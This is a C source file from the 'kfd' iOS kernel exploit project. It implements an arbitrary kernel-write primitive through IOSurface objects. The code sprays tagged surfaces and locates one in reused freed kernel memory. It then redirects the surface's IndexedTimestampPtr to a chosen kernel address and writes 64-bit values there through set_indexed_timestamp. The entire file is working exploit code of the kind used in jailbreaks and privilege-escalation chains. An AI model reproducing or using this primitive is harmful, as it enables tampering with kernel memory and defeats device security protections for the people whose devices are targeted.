//
//  kwrite_IOSurface.h
//  kfd
//
//  Created by Lars Fröder on 30.07.23.
//
// I attempted to make this standalone from kread but that probably doesn't work, so just select IOSurface for both kread and kwrite

#include "kwrite_IOSurface.h"

io_connect_t g_surfaceConnect = 0;

void kwrite_IOSurface_init(struct kfd* kfd)
{
    kfd->kwrite.krkw_maximum_id = 0x4000;
    kfd->kwrite.krkw_object_size = 0x400; //estimate
    
    kfd->kwrite.krkw_method_data_size = ((kfd->kwrite.krkw_maximum_id) * (sizeof(struct iosurface_obj)));
    kfd->kwrite.krkw_method_data = malloc_bzero(kfd->kwrite.krkw_method_data_size);
    
    // For some reson on some devices calling get_surface_client crashes while the PUAF is active
    // So we just call it here and keep the reference
    g_surfaceConnect = get_surface_client();
}

void kwrite_IOSurface_allocate(struct kfd* kfd, uint64_t id)
{
    struct iosurface_obj *objectStorage = (struct iosurface_obj *)kfd->kwrite.krkw_method_data;
    
    IOSurfaceFastCreateArgs args = {0};
    args.IOSurfaceAddress = 0;
    args.IOSurfaceAllocSize =  (uint32_t)id + 1;
    
    args.IOSurfacePixelFormat = IOSURFACE_MAGIC;
    
    objectStorage[id].port = create_surface_fast_path(g_surfaceConnect, &objectStorage[id].surface_id, &args);
}

bool kwrite_IOSurface_search(struct kfd* kfd, uint64_t object_uaddr)
{
    uint32_t magic = dynamic_uget(IOSurface, PixelFormat, object_uaddr);
    if (magic == IOSURFACE_MAGIC) {
        uint64_t id = dynamic_uget(IOSurface, AllocSize, object_uaddr) - 1;
        kfd->kwrite.krkw_object_id = id;
        return true;
    }
    return false;
}

void kwrite_IOSurface_kwrite(struct kfd* kfd, void* uaddr, uint64_t kaddr, uint64_t size)
{
    volatile uint64_t* type_base = (volatile uint64_t*)(uaddr);
    uint64_t type_size = ((size) / (sizeof(uint64_t)));
    for (uint64_t type_offset = 0; type_offset < type_size; type_offset++) {
        uint64_t type_value = type_base[type_offset];
        kwrite_IOSurface_kwrite_u64(kfd, kaddr + (type_offset * sizeof(uint64_t)), type_value);
    }
}

void kwrite_IOSurface_find_proc(struct kfd* kfd)
{
    return;
}

void kwrite_IOSurface_deallocate(struct kfd* kfd, uint64_t id)
{
    // TODO: release_surface
//    if (id != kfd->kwrite_iosurface.krkw_object_id) {
//        struct iosurface_obj *objectStorage = (struct iosurface_obj *)kfd->kwrite_iosurface.krkw_method_data;
//        release_surface(objectStorage[id].port, objectStorage[id].surface_id);
//    }
}

void kwrite_IOSurface_free(struct kfd* kfd)
{
    // TODO: release_surface
//    struct iosurface_obj *objectStorage = (struct iosurface_obj *)kfd->kwrite_iosurface.krkw_method_data;
//    struct iosurface_obj krwObject = objectStorage[kfd->kwrite_iosurface.krkw_object_id];
//    release_surface(krwObject.port, krwObject.surface_id);
}

/*
 * 64-bit kwrite function.
 */

void kwrite_IOSurface_kwrite_u64(struct kfd* kfd, uint64_t kaddr, uint64_t new_value)
{
    uint64_t iosurface_uaddr = 0;
    struct iosurface_obj krwObject = { 0 };
    
    iosurface_uaddr = kfd->kwrite.krkw_object_uaddr;
    struct iosurface_obj *objectStorage = (struct iosurface_obj *)kfd->kwrite.krkw_method_data;
    krwObject = objectStorage[kfd->kwrite.krkw_object_id];
    
    uint64_t backup = dynamic_uget(IOSurface, IndexedTimestampPtr, iosurface_uaddr);
    dynamic_uset(IOSurface, IndexedTimestampPtr, iosurface_uaddr, kaddr);
    
    set_indexed_timestamp(krwObject.port, krwObject.surface_id, 0, new_value);
    dynamic_uset(IOSurface, IndexedTimestampPtr, iosurface_uaddr, backup);
}
